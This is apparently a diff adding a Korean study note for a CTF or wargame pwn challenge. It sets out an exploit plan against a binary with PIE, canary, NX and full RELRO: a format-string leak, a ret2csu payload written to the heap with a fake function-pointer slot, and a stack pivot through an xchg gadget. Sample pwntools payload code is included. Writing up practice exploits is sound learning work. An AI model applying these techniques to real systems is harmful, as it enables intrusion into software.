@@ -1,0 +1,42 @@
+##day59-p2
+
+##보호기법
+pie canary nx on full relro
+
+##계획
+1차 입력 fsb 확인 2차 입력은 molloc_plt가 호출되는것을 보고 2번째 read의 rsi가 heap주소인것을 확인
+즉 2차입력은 heap에 입력이다 3차입력은 bof확인 bof의 크기가 작기 때문에 pivot해야하는데
+2차 입력이 heap에 들어가니 여기서 pivot하면 될듯?
+
+어셈블리를 봤을때 win함수로 보이는 부분 발견 인자 3개를 받는데 pop rdi pop rsi만 있고 pop rdx가 없음
+csu 사용해야함 
+
+find 프로그램으로 pie, canary, heap 인덱스 후보를 결정하고 gdb에서 입력 후 확인 heap은 2차 read의 rsi를
+보면 비교 가능
+
+##익스플로잇 구조
+1차에서 pie canary heap leak
+2차 입력은 csu pop, csu call을 이용해서 인자를 넣는데 win주소를 그대로 넣으면 [win] 을 호출하기때문에 
+실패할 수 있음 win slot을 만들어야 한다 그래서 heap + 0x100 위치를 win slot으로 놓고
+payload2 = p64(csu_pop)
+payload2 += p64(0)
+payload2 += p64(1)
+payload2 += p64(win_slot)
+payload2 += p64(arg1)
+payload2 += p64(arg2)
+payload2 += p64(arg3)
+payload2 += p64(csu_call)
+payload2 += p64(0)
+payload2 += p64(0)
+payload2 += p64(0)
+payload2 += p64(0)
+payload2 += p64(0)
+payload2 += p64(0)
+payload2 += p64(0)
+
+payload2 = payload2.ljust(0x100, b"A") 여기가 핵심 0x100까지 남은 거리를 A로 채우고
+payload2 += p64(win) win주소를 넣어놓으면 [win_slot] = win 이 된다
+
+3차입력은 bof니까
+패딩 + 카나리 + 더미 + pop_rax + heap + xchg
+xchg 는 내부적으로 rsp = rax니까 rax에 heap을 넣어놓으면 rsp가 fake stack 즉 heap으로 넘어간다
